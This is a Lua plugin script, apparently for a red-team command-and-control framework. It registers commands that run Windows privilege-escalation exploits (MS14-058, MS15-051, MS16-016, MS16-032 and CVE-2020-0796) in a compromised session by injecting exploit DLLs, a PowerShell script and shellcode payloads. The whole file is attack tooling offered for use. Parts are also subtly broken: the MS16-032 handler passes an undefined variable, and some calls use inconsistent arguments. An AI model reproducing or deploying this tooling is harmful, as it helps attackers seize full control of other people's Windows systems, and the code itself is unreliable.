-- to do
local elevate = {}
elevate_dir = "ElevateKit/"
function new_sacrifice_lua()
    local sac = new_sacrifice(0,false,false,false,"")
end
-- start ms14-058
function elevate.parse_ms14_058(args)
    if #args < 1 then
        -- to do shellcode self
        print("Usage: ms14-058 <command>")
        return nil
    end
    local shellcode = payload_local(args[1])
    return {shellcode}
end
function elevate.run_ms14_058(args)
    local session = active()
    args = elevate.parse_ms14_058(args)
    print(args[1])
    local arch = session.Os.Arch
    local dllpath = script_resource(elevate_dir .. "cve-2014-4113" .. "." .. arch .. ".dll")
    return inline_dll(session, dllpath,"",args, true, 60, arch, "")
end
command("elevatekit:ms14-058", elevate.run_ms14_058, "elevatekit ms14-058", "")
-- end ms14-058

-- start ms15-051
function elevate.run_ms15_051(args)
    local session = active()
    args[1] = payload_local(args[1])
    local arch = session.Os.Arch
    local dllpath = script_resource(elevate_dir .. "cve-2015-1701" .. "." .. arch .. ".dll")
    return inline_dll(session, dllpath,"",args, true, 60, arch, "")
end
command("elevatekit:ms15-051", elevate.run_ms15_051, "elevatekit ms15-051", "")
-- end ms15-051

-- start ms16-016
function elevate.run_ms16_016(args)
    local session = active()
    args[1] = payload_local(args[1])
    local arch = session.Os.Arch
    local dllpath = script_resource(elevate_dir .. "cve-2016-0051" .. "." .. arch .. ".dll")
    return inline_dll(session, dllpath, args, true)
end
command("elevatekit:ms16-016", elevate.run_ms16_016, "elevatekit ms16-016", "")
-- end ms16-016

-- start ms16-032
function elevate.run_ms16_032(args)
    local session = active()
    local arch = session.Os.Arch
    local ps_script = script_resource( elevate_dir .. "Invoke-MS16032.ps1")
    return powerpick(session, dllpath, args, true,false,false)
end
command("elevatekit:ms16-032", elevate.run_ms16_032, "elevatekit ms16-032", "")
-- end ms16-032

-- start cve_2020_0796
function elevate.run_cve_2020_0796(args)
    session = active()
    arch = session.Os.Arch
    if arch == "x32" then
        error("x32 not supported")
        return
    end
    args[1] = payload_local(args[1])

    dllpath = script_resource(elevate_dir .. "cve-2020-0796" .. "." .. arch .. ".dll")
    return inline_dll(session, dllpath, args, true)
end
command("elevatekit:cve-2020-0796", elevate.run_cve_2020_0796, "elevatekit cve-2020-0796", "")
-- end cve_2020_0796

